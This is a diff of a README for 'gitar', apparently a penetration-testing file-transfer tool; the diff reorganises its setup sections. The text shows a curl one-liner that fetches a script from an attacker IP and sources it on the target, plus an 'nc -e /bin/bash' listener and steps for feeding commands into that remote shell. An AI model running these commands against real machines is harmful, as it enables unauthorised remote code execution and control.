@@ -39,23 +39,22 @@ The aim is to keep "target requirements" as fit as possible. Attacker machine re
 
 ### 🎸 Launch `gitar` server 
  
-#### (Attacker machine)
-
-Launch `gitar` server: 
+On **Attacker machine**: 
 ```shell
 gitar
 ```
 
-#### (Target machine)
+On **Target machine**:
 
-Get shortcuts and source them. The one-liner corresponding is by default copy on clipboard. It is also provided by step 1. (in gitar output):
 ```shell
+# Get shortcuts and source them. The one-liner corresponding is by default copy on clipboard. 
+# It is also provided by step 1. (in gitar output):
 curl -s http://[attacker_ip:port]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias
 ```
 
 **And that's all, you can now `push` or `pull` file [🎶](#tldr---and-listen-music)**
 
- [`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files)
+ <sup>[`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files)</sup>
 
 ### 🐋 Secure launch of `gitar` server
 
@@ -65,35 +64,42 @@ This is basicaly the same as launching `gitar` server. But as we expose our http
 *To use container image, you have to built it from ` Dockerfile`: `make build.gitar.image`*
 
 The following steps expose files of current directory. Files uploaded by remote are written inside current directory also.
-#### (Attacker machine)
 
-Launch `gitar` server: 
+On **Attacker machine**: 
 ```shell
 docker run --rm --cap-drop=all -v "${PWD}:/gitar/exchange" ariary/gitar
 ```
-⚠️: to enable host volume in container we must (?) use root user within 
 
 
-#### (Target machine)
+On **Target machine**:
 
 Get shortcuts and source them. The one-liner corresponding is in the container stdout.
 
 **You can now `push`or `pull` file being more safe [🎶](#tldr---and-listen-music)**
 
-[`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files-safely)
+*⚠️: to enable host volume in container we must (?) use root user within *
+<sup>[`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files-safely)</sup>
+
+
+## Install
+
+```shell
+go install github.com/ariary/gitar@latest
+```
+
+## Bonus
 
 ### Load shortcut directly in your reverse shell
 
 **~>** *Below are the steps to have shortcuts directly embedded in your `nc` reverse shell*
 
-#### (Target machine)
-
-Launch your classic listener:
+On **Target machine**:
 ```shell
+# Launch your classic listener
 nc -nvlp 4444 -e /bin/bash
 ```
 
-#### (Attacker machine)
+On **Attacker machine**:
 
 1. Launch `gitar`server : `gitar -e [server_reachable_ip]` *(By default this will copy on clipboard the command to set up gitar exchange, also available in server output)*
 2. Connect to the reverse shell + load shortcut within:`nc [VICTIM_IP] 4444` then `[CTRL+V]` 
@@ -102,11 +108,6 @@ An alternative is `export CMD=[CTRL+V] && (echo $CMD && cat) | nc [VICTIM_IP] 44
 
 **And enjoy you revshell [🎶](#tldr---and-listen-music)**
 
-## Install
-
-```shell
-go install github.com/ariary/gitar@latest
-```
 
 	
 	
